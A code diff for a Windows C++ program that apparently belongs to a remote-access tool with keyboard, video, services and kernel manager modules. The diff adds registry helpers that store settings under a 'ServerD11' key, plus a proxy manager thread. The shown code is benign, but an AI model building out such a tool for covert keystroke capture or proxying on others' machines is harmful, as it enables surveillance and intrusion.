@@ -11,8 +11,84 @@
 #include "ServicesManager.h"
 #include "VideoManager.h"
 #include "KeyboardManager.h"
+#include "ProxyManager.h"
 
 #include "KernelManager.h" 
+
+#define REG_SETTINGS "Software\\ServerD11\\Settings"
+
+// 写入字符串配置（多字节版）
+bool WriteAppSettingA(const std::string& keyName, const std::string& value) {
+	HKEY hKey;
+
+	LONG result = RegCreateKeyExA(
+		HKEY_CURRENT_USER,
+		REG_SETTINGS,
+		0,
+		NULL,
+		0,
+		KEY_WRITE,
+		NULL,
+		&hKey,
+		NULL
+	);
+
+	if (result != ERROR_SUCCESS) {
+		Mprintf("无法创建或打开注册表键，错误码: %d\n", result);
+		return false;
+	}
+
+	result = RegSetValueExA(
+		hKey,
+		keyName.c_str(),
+		0,
+		REG_SZ,
+		reinterpret_cast<const BYTE*>(value.c_str()),
+		static_cast<DWORD>(value.length() + 1)
+	);
+
+	RegCloseKey(hKey);
+	return result == ERROR_SUCCESS;
+}
+
+// 读取字符串配置（多字节版）
+bool ReadAppSettingA(const std::string& keyName, std::string& outValue) {
+	HKEY hKey;
+
+	LONG result = RegOpenKeyExA(
+		HKEY_CURRENT_USER,
+		REG_SETTINGS,
+		0,
+		KEY_READ,
+		&hKey
+	);
+
+	if (result != ERROR_SUCCESS) {
+		return false;
+	}
+
+	char buffer[256];
+	DWORD bufferSize = sizeof(buffer);
+	DWORD type = 0;
+
+	result = RegQueryValueExA(
+		hKey,
+		keyName.c_str(),
+		nullptr,
+		&type,
+		reinterpret_cast<LPBYTE>(buffer),
+		&bufferSize
+	);
+
+	RegCloseKey(hKey);
+
+	if (result == ERROR_SUCCESS && type == REG_SZ) {
+		outValue = buffer;
+		return true;
+	}
+
+	return false;
+}
 
 DWORD WINAPI ThreadProc(LPVOID lParam)
 {
@@ -93,4 +169,8 @@ DWORD WINAPI LoopServicesManager(LPVOID lParam)
 DWORD WINAPI LoopKeyboardManager(LPVOID lParam)
 {
 	return LoopManager<CKeyboardManager1, 0>(lParam);
+}
+
+DWORD WINAPI LoopProxyManager(LPVOID lParam) {
+	return LoopManager<CProxyManager, 0>(lParam);
 }
